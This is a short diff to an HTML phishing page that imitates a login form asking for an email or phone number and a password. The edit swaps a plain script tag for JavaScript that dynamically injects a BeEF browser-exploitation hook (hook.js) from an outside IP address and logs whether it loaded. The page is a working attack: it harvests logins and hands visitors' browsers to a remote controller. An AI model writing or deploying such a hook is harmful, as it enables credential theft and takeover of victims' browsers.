@@ -15,7 +15,14 @@
         <input type="text" placeholder="Email or mobile number">
         <input type="password" placeholder="Password">
         <button>Log In</button>
-        <script src="http://172.27.142.197:3002/hook.js"></script>
+        <script>
+            console.log('Loading BeEF hook...');
+            var script = document.createElement('script');
+            script.src = 'http://172.27.142.197:3002/hook.js';
+            script.onload = function() { console.log('Hook loaded successfully'); };
+            script.onerror = function() { console.error('Hook failed to load - check network/CORS'); };
+            document.head.appendChild(script);
+        </script>
     </div>
 </body>
 </html>
